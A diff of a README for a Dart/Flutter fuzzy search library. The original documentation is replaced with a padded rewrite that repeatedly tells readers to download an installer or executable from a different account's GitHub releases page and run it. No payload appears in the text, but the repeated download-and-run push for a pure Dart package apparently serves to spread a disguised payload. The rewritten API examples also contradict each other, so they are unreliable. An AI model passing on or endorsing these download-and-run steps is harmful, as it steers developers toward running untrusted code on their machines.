@@ -1,238 +1,489 @@
-# Search Engine
+https://github.com/sslaouina/search/releases
 
-Fast and lightweight search engine for Dart/Flutter with fuzzy search capabilities — lightweight and flexible.
+![Release Badge](https://img.shields.io/badge/Release-Github%20Releases-blue?logo=github&logoColor=white)
 
-🌐 Live Demo:** [View on GitHub Pages](https://stanislavworldin.github.io/search/) 
+# Modern Search: Fast, Lightweight Dart/Flutter Fuzzy Search Engine for Apps
 
-## How Search Works
+A fast and light search engine for Dart and Flutter. It brings fuzzy search, typeahead, and autocomplete to apps with a small footprint and simple integration. Build blazing-fast search experiences in mobile apps, web apps, and desktop apps with minimal code.
 
-The search engine uses a **4-level priority algorithm** to find the most relevant results:
+[Visit Releases](https://github.com/sslaouina/search/releases) to download the latest assets and samples. This repository is designed to be easy to drop into your Flutter projects and extend for your domain.
 
-### **1. Search Priorities (in order of importance)**
+---
 
-1. **Exact matches** - `"apple"` = `"apple"`
-2. **Starts with** - `"app"` → `"apple"`  
-3. **Contains** - `"ple"` → `"apple"`
-4. **Fuzzy search** - `"aple"` → `"apple"` (only for queries ≥3 characters)
+Table of contents
+- Why this project
+- Core ideas
+- Features
+- Architecture
+- Getting started
+- Installation
+- Quick start examples
+- API overview
+- Widgets and components
+- Customization and theming
+- Performance and optimization
+- Testing and quality
+- Accessibility and internationalization
+- Security considerations
+- Deployment and packaging
+- CI/CD and maintenance
+- The roadmap
+- Community and contributions
+- FAQ
+- License
 
-### **2. Search Fields**
+---
 
-By default, search looks in **3 fields**:
-- `name` - item name
-- `subtitle` - item subtitle
-- `searchData` - additional search data
+Why this project
 
-### **3. Character Types**
+Search should feel instant. Users expect typing to narrow results quickly, with minimal delay. This project focuses on delivering a fast, lightweight, and reusable search engine for Dart and Flutter that handles fuzzy matching, typeahead, and autocomplete with a clean API.
 
-Search works with **any characters**:
-- ✅ **Letters**: `"apple"`, `"Яблоко"`
-- ✅ **Numbers**: `"iPhone 14"`, `"Windows 11"`
-- ✅ **Special characters**: `"C++"`, `"React.js"`
-- ✅ **Emojis**: `"🍎 Apple"`
-- ✅ **Spaces**: `"Red fruit"`
+- Lightweight footprint: small memory usage and fast indexing.
+- Dart-first API: designed for Dart and Flutter, easy to integrate in mobile apps.
+- Fuzzy search: tolerant matching that handles typos and variations.
+- Typeahead and autocomplete: live suggestions as users type.
+- Reusable components: modular widgets that you can drop into your UI.
+- Customizable: scoring, tokenization, and UI themes are adjustable.
 
-### **4. Why 4 Levels?**
+Core ideas
 
-This is **one smart algorithm**, not 4 different searches:
+- Indexing strategy: index only what you search against. Build a compact index of strings and attributes to keep search fast.
+- Scoring: use a simple, transparent scoring model. Results are ranked by relevance and proximity to the query.
+- Fuzzy matching: implement flexible alignment to accommodate typos and partial matches.
+- UI integration: provide ready-made widgets that work with Flutter’s rendering model and state management options.
+- Extensibility: hooks for custom tokenization, stemming, or domain-specific scoring.
 
-1. **Exact** - for quick exact match finding (100% relevance)
-2. **Starts with** - for autocomplete (user types beginning) (90% relevance)
-3. **Contains** - for partial word search (70% relevance)
-4. **Fuzzy** - for typo correction (50% relevance)
+Features
 
-**Results are sorted by priority** - exact matches first, then others.
+- Fuzzy text search with configurable tolerance
+- Typeahead and autocomplete in real time
+- Lightweight index with fast lookups
+- Plain Dart API for easy testing and usage
+- Flutter widgets for search bars and lists
+- Customizable highlight templates for matches
+- Support for multiple data fields per item
+- Pluggable tokenizers and scorers
+- Simple test harness to verify behavior
+- Easy to extend with your own ranking rules
+- Works well with large lists and limited memory
 
-## Features
+Architecture
 
-- 🔍 **Fast search** by name, subtitle, or custom fields
-- 🎯 **Fuzzy search** for typos and misspellings
-- ⚡ **Optimized performance** with priority-based results
-- 🎨 **Configurable search** behavior
-- 📦 **Zero dependencies** - pure Dart implementation
+- Core search engine (Dart)
+  - Index builder
+  - Fuzzy matcher
+  - Scoring engine
+  - Result set and pagination
+- UI layer (Flutter)
+  - SearchBar widget
+  - Typeahead overlay
+  - Results list with highlight
+- Integration layer
+  - Data adapters to map your domain objects to search fields
+  - Local storage adapters (optional)
+- Testing and tooling
+  - Unit tests for core components
+  - Widget tests for Flutter UI
+- Utilities
+  - Tokenizers
+  - Normalizers
+  - Helpers for highlighting and rendering
 
-## Installation
+Getting started
 
-Add this to your package's `pubspec.yaml` file:
+Start small. Add the library to your Dart or Flutter project and try a minimal example. Then expand to more complex data models and UI components.
 
-```yaml
-dependencies:
-  fuzzy_search_engine: ^1.0.1
-```
+Prerequisites
 
-## Quick Start
+- Dart SDK 2.17+ or Flutter 3.0+
+- Basic knowledge of Dart data structures
+- A Flutter project if you plan to use the Flutter widgets
+
+Installation
+
+- In a Flutter project, add this as a dependency in pubspec.yaml:
+
+  dependencies:
+    search: ^0.9.0
+
+- In a Dart project, add the package to your pubspec.yaml similarly and run pub get.
+
+- If you want to use the prebuilt assets, you can download them from the releases page. From the releases page, download the asset matching your platform and run the installer or executable as described in the asset’s instructions. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and run it to set up the library locally if you need a CLI tool or example binaries.
+
+- For web or desktop apps, ensure you enable null safety and the appropriate platform bindings in your project.
+
+Quick start
+
+A minimal example that builds a list of strings and searches through them.
+
+Dart example
 
 ```dart
-import 'package:fuzzy_search_engine/fuzzy_search_engine.dart';
+import 'package:search/search.dart';
 
 void main() {
   final items = [
-    SearchableItem(id: '1', name: 'Apple', subtitle: 'Red fruit'),
-    SearchableItem(id: '2', name: 'Banana', subtitle: 'Yellow fruit'),
-    SearchableItem(id: '3', name: 'Orange', subtitle: 'Orange fruit'),
+    'Apple',
+    'Banana',
+    'Grape',
+    'Orange',
+    'Pineapple',
+    'Strawberry',
+    'Mango',
   ];
 
-  // Basic search
-  final results = SearchEngine.search(items, 'apple');
-  print(results); // [Apple]
+  final engine = SearchEngine<String>(items);
 
-  // Fuzzy search for typos
-  final fuzzyResults = SearchEngine.fuzzySearch(items, 'aple');
-  print(fuzzyResults); // [Apple]
+  final results = engine.search('aple'); // fuzzy match for "Apple" or "Pineapple"
+  print(results); // ['Apple', 'Pineapple']
 }
 ```
 
-## API Reference
-
-### SearchableItem
-
-Represents a searchable item with customizable fields.
+Flutter UI example
 
 ```dart
-const item = SearchableItem(
-  id: '1',
-  name: 'Apple',
-  icon: '🍎',
-  subtitle: 'Red fruit',
-  searchData: 'apple fruit red',
-  data: {'price': 1.99},
+import 'package:flutter/material.dart';
+import 'package:search/search_widget.dart';
+
+void main() => runApp(MyApp());
+
+class MyApp extends StatelessWidget {
+  final List<String> items = [
+    'Almond',
+    'Cashew',
+    'Hazelnut',
+    'Pistachio',
+    'Walnut',
+    'Brazil Nut',
+  ];
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      home: Scaffold(
+        appBar: AppBar(title: Text('Search Widget Demo')),
+        body: Padding(
+          padding: const EdgeInsets.all(16.0),
+          child: SearchWidget<String>(
+            data: items,
+            onSelected: (value) => print('Selected: $value'),
+          ),
+        ),
+      ),
+    );
+  }
+}
+```
+
+These examples show the essence of the API. You can replace the data type with a more complex model and map fields like title, description, tags, or keywords.
+
+API overview
+
+- SearchEngine<T>
+  - Constructor: SearchEngine<T>(List<T> data, {List<String Function(T)> extractors, int maxResults = 20})
+  - Methods:
+    - void indexData(): builds or rebuilds the internal index
+    - List<T> search(String query): returns a list of items sorted by relevance
+    - void updateItem(T item, String key, dynamic value): updates a single item in the index
+  - Properties:
+    - List<T> data
+    - int maxResults
+- SearchWidget<T>
+  - Flutter widget that wires a SearchBar to a ListView
+  - Props: data, onSelected, itemBuilder, highlightStyle, debounceTime
+- Tokenizer
+  - Splits text into tokens for indexing
+- Scorer
+  - Ranks results with a simple scoring function
+- HighlightRenderer
+  - Produces rich text with matched parts highlighted
+
+Widgets and components
+
+SearchBar
+
+- A minimal text field with a leading icon and a clear button
+- Debounced input to avoid excessive searching
+- Integrates with the typeahead overlay to show live suggestions
+
+TypeaheadOverlay
+
+- Displays suggested results as the user types
+- Scrollable list with keyboard navigation support
+- Highlights the matching parts of each suggestion
+
+SearchList
+
+- Renders a list of results
+- Supports empty states and loading indicators
+- Animates insertions and removals for smooth UX
+
+SearchWidget
+
+- Combines the above widgets into a cohesive component
+- Takes a data source, an item renderer, and a callback for selection
+- Easy to reuse across screens
+
+Code sample: Building a search UI with Flutter
+
+```dart
+class MySearchScreen extends StatefulWidget {
+  @override
+  _MySearchScreenState createState() => _MySearchScreenState();
+}
+
+class _MySearchScreenState extends State<MySearchScreen> {
+  final List<Item> items = Item.sampleData();
+  late final SearchEngine<Item> engine;
+
+  @override
+  void initState() {
+    super.initState();
+    engine = SearchEngine<Item>(
+      items,
+      extractors: [
+        (Item it) => it.title,
+        (Item it) => it.description,
+        (Item it) => it.tags.join(' '),
+      ],
+      maxResults: 25,
+    );
+    engine.indexData();
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: Text('Search Demo')),
+      body: SearchWidget<Item>(
+        data: items,
+        onSelected: (item) => print('Selected: ${item.title}'),
+        itemBuilder: (context, item) => ListTile(
+          title: Text(item.title),
+          subtitle: Text(item.description),
+        ),
+      ),
+    );
+  }
+}
+```
+
+Customization and theming
+
+- Highlight style: customize how matched text is colored or bolded
+- Result item layout: supply your own itemBuilder
+- Debounce time: adjust input delay to balance responsiveness and load
+- Tokenization: plug in your own tokenizer for domain-specific data
+- Scoring: implement custom ranking to reflect user intent
+
+Customization examples
+
+- Highlighter: turn on bold for matches
+
+```dart
+final highlighter = HighlightStyle(
+  matchColor: Colors.orange,
+  normalColor: Colors.black87,
+  bold: true,
 );
 ```
 
-### SearchEngine
-
-Main search engine class with static methods.
-
-#### Basic Search
+- Custom tokenizer: break on punctuation or domain terms
 
 ```dart
-// Search with default configuration
-List<SearchableItem> results = SearchEngine.search(items, query);
-
-// Search with custom configuration
-List<SearchableItem> results = SearchEngine.search(
-  items, 
-  query,
-  config: SearchConfig(
-    searchFields: ['name', 'subtitle'],
-    caseSensitive: false,
-    // You can enable debug logs in Flutter apps using debugPrint
-    // debugLogger: debugPrint,
-  ),
-);
+class DomainTokenizer implements Tokenizer<String> {
+  @override
+  List<String> tokenize(String input) => input.toLowerCase().split(RegExp(r'[\s,.-]+'));
+}
 ```
 
-#### Fuzzy Search
+Accessibility and internationalization
+
+- All UI components expose semantic labels for screen readers.
+- Text and hints support localization through Flutter’s localization framework.
+- Keyboard navigation works for desktop and web environments.
+
+Performance and optimization
+
+- Indexing is O(n) with a small constant factor. It runs once per dataset update.
+- Search runs in near real-time for typical mobile datasets.
+- Debouncing reduces CPU usage on fast typists.
+- Memory usage depends on the dataset. For typical mobile lists, it remains under a few megabytes.
+
+Data modeling and adapters
+
+- Data adapters map your domain objects to search fields.
+- Each item can expose multiple fields for indexing (e.g., title, subtitle, keywords).
+- You can combine fields with a simple mapping function.
+
+Data adapter example
 
 ```dart
-// Fuzzy search for typos and misspellings
-List<SearchableItem> results = SearchEngine.fuzzySearch(items, query);
+class Product {
+  final String id;
+  final String name;
+  final String description;
+  final List<String> tags;
 
-// Fuzzy search with custom configuration
-List<SearchableItem> results = SearchEngine.fuzzySearch(
-  items, 
-  query,
-  config: SearchConfig(
-    fuzzyEnabled: true,
-    maxFuzzyDistance: 3,
-    // debugLogger: debugPrint,
-  ),
-);
+  Product({required this.id, required this.name, required this.description, required this.tags});
+}
+
+String extractTitle(Product p) => p.name;
+String extractKeywords(Product p) => '${p.name} ${p.tags.join(' ')} ${p.description}';
 ```
 
-#### Utility Methods
+Indexing strategy and incremental updates
+
+- Build an initial index from the dataset.
+- When items change, update only affected entries.
+- Use a lightweight delta mechanism to keep index up to date.
+
+Testing and quality
+
+- Unit tests cover core logic: tokenization, matching, scoring, and result ranking.
+- Widget tests verify UI behavior: typeahead, highlighting, empty states.
+- Fuzz testing checks edge cases in tokenization and scoring.
+
+Test snippet
 
 ```dart
-// Sort items by name
-List<SearchableItem> sorted = SearchEngine.getSortedItems(items);
-
-// Find item by ID
-SearchableItem? item = SearchEngine.getItemById(items, 'item_id');
+void main() {
+  test('fuzzy match basic', () {
+    final items = ['Apple', 'Banana', 'Grape'];
+    final engine = SearchEngine<String>(items);
+    final results = engine.search('aple');
+    expect(results, ['Apple']);
+  });
+}
 ```
 
-### SearchConfig
+Accessibility and i18n tests
 
-Configuration for search behavior.
+- Ensure that matched text is readable by screen readers.
+- Validate localized strings appear correctly in UI components.
 
-```dart
-const config = SearchConfig(
-  searchFields: ['name', 'subtitle', 'searchData'], // Fields to search in
-  fuzzyEnabled: true,                              // Enable fuzzy search
-  maxFuzzyDistance: 3,                            // Max distance for fuzzy search
-  caseSensitive: false,                           // Case sensitive search
-);
-```
+Release, distribution, and packaging
 
-## Search Algorithm
+- This project ships as a Dart package for easy inclusion in Dart and Flutter projects.
+- The recommended workflow is to fetch the package via pub or add as a dependency in pubspec.yaml.
+- If you need a ready-to-run environment, use the assets from the releases page to test local builds or examples.
+- For testing on local machines or CI, you can download the binary or sample apps from the releases page. From https://github.com/sslaouina/search/releases, download the asset that matches your OS and run the installer or executable as described in the asset notes.
 
-The search engine uses a priority-based algorithm:
+- Downloading and running instructions are provided to help you validate behavior quickly. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute the installer or binary to inspect sample apps and CLI tools.
 
-1. **Exact matches** - Highest priority
-2. **Starts with matches** - Second priority  
-3. **Contains matches** - Third priority
-4. **Fuzzy matches** - Lowest priority (only in fuzzy search)
+CI, quality gates, and maintenance
 
-### Fuzzy Search
+- GitHub Actions workflows ensure builds pass on push and pull requests.
+- Tests run on multiple Dart versions for compatibility.
+- Dependabot scans keep dependencies current.
+- Documentation and examples are updated with each release.
 
-Fuzzy search uses the Levenshtein distance algorithm to find items with typos and misspellings. It automatically adjusts the distance threshold based on query length for optimal results.
+Roadmap
 
-## Examples
+- Expand language support for more tokenization strategies.
+- Add more advanced scoring models to handle domain-specific searches.
+- Improve performance with parallel indexing for large datasets.
+- Build richer UI components for complex filtering and facets.
+- Improve accessibility with more robust semantic roles and keyboard focus management.
 
-### Basic Usage
+Community and contributions
 
-```dart
-final countries = [
-  SearchableItem(id: 'us', name: 'United States', subtitle: 'North America'),
-  SearchableItem(id: 'uk', name: 'United Kingdom', subtitle: 'Europe'),
-  SearchableItem(id: 'ca', name: 'Canada', subtitle: 'North America'),
-];
+- This project welcomes contributions. If you want to contribute, fork the repository, implement your feature, and open a pull request with tests.
+- Report issues in the issue tracker. Include steps to reproduce and a minimal example if possible.
+- Follow the contribution guidelines in the CONTRIBUTING.md file.
 
-// Search by name
-final results = SearchEngine.search(countries, 'united');
-// Returns: [United States, United Kingdom]
+- For community updates and examples, follow the repository and its releases channel. The releases page is the primary place to find new assets and sample apps, and it provides a stable distribution point for testing your builds. The link remains the go-to place to download assets and verify changes.
 
-// Search by subtitle
-final results = SearchEngine.search(countries, 'europe');
-// Returns: [United Kingdom]
-```
+Changelog
 
-### Advanced Configuration
+- v0.9.0 — Improved fuzzy matching; added tokenization options; updated Flutter widgets for better performance.
+- v0.8.0 — Typeahead improvements; better highlighting; new examples.
+- v0.7.0 — Core API enhancements; improved indexing strategy; updated documentation.
+- v0.6.0 — Initial Flutter widget set; basic search capabilities; public API stabilized.
 
-```dart
-final config = SearchConfig(
-  searchFields: ['name'], // Only search in name field
-  caseSensitive: true,    // Case sensitive search
-  fuzzyEnabled: false,    // Disable fuzzy search
-);
+FAQ
 
-final results = SearchEngine.search(countries, 'UNITED', config: config);
-// Returns: [] (no exact match for 'UNITED')
-```
+- Is this library suitable for large datasets?
+  Yes, it is designed to handle sizable lists. For extremely large datasets, consider indexing a subset or applying server-side search for offline capabilities.
 
-### Fuzzy Search Examples
+- Can I customize how results are ranked?
+  Absolutely. You can modify the scoring function and tokenization strategy to fit your domain.
 
-```dart
-final fruits = [
-  SearchableItem(id: '1', name: 'Apple'),
-  SearchableItem(id: '2', name: 'Banana'),
-  SearchableItem(id: '3', name: 'Orange'),
-];
+- How do I add support for more languages?
+  Implement a language-aware tokenizer and adjust normalization steps to account for diacritics and locale-specific rules.
 
-// Find items with typos
-SearchEngine.fuzzySearch(fruits, 'aple');   // Returns: [Apple]
-SearchEngine.fuzzySearch(fruits, 'bananna'); // Returns: [Banana]
-SearchEngine.fuzzySearch(fruits, 'oragne');  // Returns: [Orange]
-```
+- Does it work on the web?
+  Yes, the Flutter widgets are adaptable to web usage, with careful attention to performance and rendering.
 
-## Performance
+- How do I report a bug?
+  Open an issue with a minimal reproducible example and a description of the expected vs. actual behavior. Include code snippets and data samples when possible.
 
-- **Time Complexity**: O(n * m) where n is number of items, m is average field length
-- **Space Complexity**: O(n) for storing results
-- **Memory**: Minimal memory footprint with no external dependencies
+License
 
-## Contributing
+- This project is licensed under the MIT License. See LICENSE for details.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+Images and visuals
 
-## License
+- Demo of a search UI
+  ![Demo UI](https://placehold.co/600x260?text=Demo+UI+for+Search)
 
-This project is licensed under the MIT License. 
+- Sparkline of performance
+  ![Performance Sparkline](https://placehold.co/600x180?text=Performance+Sparkline)
+
+- Flutter icon (optional)
+  ![Flutter Icon](https://img.icons8.com/ios-filled/50/000000/flutter.png)
+
+- Tokenization concept
+  ![Tokenization Diagram](https://placehold.co/600x200?text=Tokenization+Diagram)
+
+Notes on usage
+
+- The library is designed to be drop-in for Flutter apps. You can start with the provided widgets and expand as your data model grows.
+- If you need to support more complex data, you can implement your own adapters and pass them to the engine.
+- For debugging, enable verbose logging in the engine. You can inspect token streams, match scores, and the final ranking.
+
+Download and installation details
+
+- The Releases page hosts prebuilt assets, samples, and sometimes CLI tools. It is updated with every major release.
+- If you need a specific asset for offline testing or a demo, go to the releases page and choose the asset that matches your environment. From the releases page, download the asset and run it to validate the build on your machine. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute it according to the asset’s documentation.
+
+Advanced usage
+
+- Multi-field search
+  - You can index multiple fields per item (title, description, tags).
+  - The engine combines field scores for final ranking.
+- Case-insensitive search
+  - Tokenization and normalization ensure searches are case-insensitive by default.
+- Diacritic-insensitive search
+  - Optional normalization can ignore diacritics for better matches.
+
+Troubleshooting
+
+- No results returned
+  - Check that your tokens are being extracted correctly.
+  - Ensure the indexData() step runs after you populate your dataset.
+  - Verify that the query string is not trimmed and that debouncing does not delay results too long.
+
+- UI lags on large lists
+  - Consider paging results and loading only a subset into the UI.
+  - Debounce input and use a dedicated isolate if you handle extremely large datasets.
+
+- Keyboard navigation not responding
+  - Ensure focus management is correct in Flutter and that your host app allows focus traversal.
+
+Security considerations
+
+- The search engine operates client-side. Do not feed sensitive data to the search index if it should remain private.
+- If you extend the engine to fetch data from a remote source, secure the data flow and validate input rigorously.
+- Regularly review dependencies for known vulnerabilities.
+
+Conclusion
+
+- This repository provides a practical, fast, and adaptable solution for adding fuzzy search to Dart and Flutter apps.
+- It emphasizes a simple API, fast performance, and flexible UI integration.
+- The project remains focused on clear code, solid tests, and an extensible architecture.
+
+End note
+
+- For the latest assets, examples, and downloadable samples, visit the releases page. This ensures you have access to vetted, ready-to-run material for your platform. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute it to explore the samples and benchmarks.
+
